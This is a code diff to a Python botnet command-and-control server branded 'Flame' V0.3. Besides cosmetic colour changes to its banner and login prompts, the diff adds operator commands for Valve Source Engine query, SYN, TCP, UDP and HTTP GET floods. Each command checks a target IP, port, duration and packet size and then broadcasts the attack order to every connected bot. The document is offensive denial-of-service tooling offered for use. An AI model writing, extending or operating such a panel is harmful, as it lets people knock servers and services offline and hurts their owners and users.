@@ -5,19 +5,20 @@ import time
 import ipaddress
 from colorama import Fore, init
 from pathlib import Path
+import json
 
 bots = {}
 ansi_clear = '\033[2J\033[H'
 
 banner = f'''
-                  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
-                  ┃ ███████╗██╗░░░░░░█████╗░███╗░░░███╗███████╗ ┃
-                  ┃ ██╔════╝██║░░░░░██╔══██╗████╗░████║██╔════╝ ┃
-                  ┃ █████╗░░██║░░░░░███████║██╔████╔██║█████╗░░ ┃
-                  ┃ ██╔══╝░░██║░░░░░██╔══██║██║╚██╔╝██║██╔══╝░░ ┃
-                  ┃ ██║░░░░░███████╗██║░░██║██║░╚═╝░██║███████╗ ┃
-                  ┃ ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝ ┃ \x1b[4;32;40m-V0.3\x1b[0m
-                  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+\x1b[3;31;40m                  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+\x1b[3;31;40m                  ┃ ███████╗██╗░░░░░░█████╗░███╗░░░███╗███████╗ ┃
+\x1b[3;31;40m                  ┃ ██╔════╝██║░░░░░██╔══██╗████╗░████║██╔════╝ ┃
+\x1b[3;31;40m                  ┃ █████╗░░██║░░░░░███████║██╔████╔██║█████╗░░ ┃
+\x1b[3;31;40m                  ┃ ██╔══╝░░██║░░░░░██╔══██║██║╚██╔╝██║██╔══╝░░ ┃
+\x1b[3;31;40m                  ┃ ██║░░░░░███████╗██║░░██║██║░╚═╝░██║███████╗ ┃
+\x1b[3;31;40m                  ┃ ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝ ┃ \x1b[1;30;40m-V0.3\x1b[0m
+\x1b[3;31;40m                  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
         '''
 
 def validate_ip(ip):
@@ -97,12 +98,12 @@ def update_title(client, username):
 
 def command_line(client):
     for x in banner.split('\n'):
-        send(client, x)
+        send(client, '\x1b[3;31;40m'+x)
     opened = 0
     if (opened == 0):
         send(client, "Type .HELP to get started(Not case sensitive)\r\n", False)
 
-    prompt = f'{Fore.LIGHTBLUE_EX}Flame {Fore.LIGHTWHITE_EX}$ '
+    prompt = f'\x1b[3;31;40mFlame \x1b[3;33;40m$ '
     send(client, prompt, False)
 
     while 1:
@@ -186,17 +187,124 @@ def command_line(client):
                     else:
                         send(client, "Invalid IP")
 
+            # Valve Source Engine query flood
+            elif command == '.VSE':
+                if len(args) == 4:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    if validate_ip(ip):
+                        if validate_port(port):
+                            if validate_time(secs):
+                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                broadcast(data)
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')
+
+            # TCP SYNchronize flood
+            elif command == '.SYN':
+                if len(args) == 4:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    if validate_ip(ip):
+                        if validate_port(port, True):
+                            if validate_time(secs):
+                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                broadcast(data)
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
+                    send(client, 'Use port 0 for random port mode')
+
+            # TCP junk data packets flood
+            elif command == '.TCP':
+                if len(args) == 5:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    size = args[4]
+                    if validate_ip(ip):
+                        if validate_port(port):
+                            if validate_time(secs):
+                                if validate_size(size):
+                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                    broadcast(data)
+                                else:
+                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')
+
+            # UDP junk data packets flood
+            elif command == '.UDP':
+                if len(args) == 5:
+                    ip = args[1]
+                    port = args[2]
+                    secs = args[3]
+                    size = args[4]
+                    if validate_ip(ip):
+                        if validate_port(port, True):
+                            if validate_time(secs):
+                                if validate_size(size):
+                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                                    broadcast(data)
+                                else:
+                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
+                            else:
+                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                        else:
+                            send(client, Fore.RED + 'Invalid port number (1-65535)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
+                    send(client, 'Use port 0 for random port mode')
+
+            # HTTP GET request flood
+            elif command == '.HTTP':
+                if len(args) == 3:
+                    ip = args[1]
+                    secs = args[2]
+                    if validate_ip(ip):
+                        if validate_time(secs):
+                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
+                            broadcast(data)
+                        else:
+                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
+                    else:
+                        send(client, Fore.RED + 'Invalid IP-address')
+                else:
+                    send(client, 'Usage: .http [IP] [TIME]')
 
             elif command.upper() == 'DEV.COLORS':
-                for style in range(8):
-                    for fg in range(30,38):
-                        s1 = ''
-                        for bg in range(40,48):
-                            format = ';'.join([str(style), str(fg), str(bg)])
-                            s1 += '\x1b[%sm %s \x1b[0m' % (format, format)
-                            cf.write(s1+'\n')
-                        send(client, s1)
-                    send(client, '\r\n')
+                try:
+                    for style in range(8):
+                        for fg in range(30,38):
+                            s1 = ''
+                            for bg in range(40,48):
+                                format = ';'.join([str(style), str(fg), str(bg)])
+                                s1 += '\x1b[%sm %s \x1b[0m' % (format, format)
+                            send(client, s1)
+                        send(client, '\r\n')
+                except Exception as e:
+                    print(e)
 
             else:
                 send(client, "Invalid command")
@@ -213,7 +321,7 @@ def handle_client(client, address):
     # username login
     while 1:
         send(client, ansi_clear, False)
-        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
+        send(client, f'\x1b[3;31;40mUsername{Fore.LIGHTWHITE_EX}: ', False)
         username = client.recv(1024).decode().strip()
         if not username:
             continue
@@ -223,7 +331,7 @@ def handle_client(client, address):
     password = ''
     while 1:
         send(client, ansi_clear, False)
-        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
+        send(client, f'\x1b[3;31;40mPassword{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
         while not password.strip(): # i know... this is ugly...
             password = client.recv(1024).decode('cp1252').strip()
         break
